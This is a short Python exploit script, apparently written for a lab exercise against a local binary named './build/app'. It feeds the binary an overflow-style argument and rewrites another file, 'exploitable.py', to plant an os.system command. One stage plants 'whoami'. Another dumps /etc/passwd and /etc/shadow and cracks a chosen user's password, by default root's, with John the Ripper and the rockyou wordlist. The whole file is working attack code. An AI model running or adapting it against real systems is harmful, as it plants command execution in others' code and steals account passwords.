import os
import sys


def overwrite_file(cmd: str) -> None:
    lines = []
    with open("exploitable.py", "r") as f:
        lines = f.readlines()
    with open("exploitable.py", "w") as f:
        for i in range(len(lines)):
            if i == len(lines) - 1:
                f.write(f"    os.system('{cmd}')\n")
            f.write(lines[i])


def first():
    exploit_string = "./build/app " + "A" * 10 + "B" * 4
    os.system(exploit_string)


def second():
    exploit_string = "python -c 'print(1)' | ./build/app " + "A" * 10 + "B" * 4
    payload = "whoami"
    overwrite_file(payload)
    os.system(exploit_string)


def third(user):
    exploit_string = "python -c 'print(1)' | ./build/app " + "A" * 10 + "B" * 4
    payload = f'/bin/bash -c "unshadow /etc/passwd /etc/shadow > pass && john -wordlist=resources/rockyou.txt -users={user} pass && john --show pass"'
    overwrite_file(payload)
    os.system(exploit_string)


if len(sys.argv) >= 2:
    if sys.argv[1] == "2":
        second()
    elif sys.argv[1] == "3":
        if len(sys.argv) == 3:
            third(sys.argv[2])
        else:
            third("root")
    else:
        first()
else:
    first()
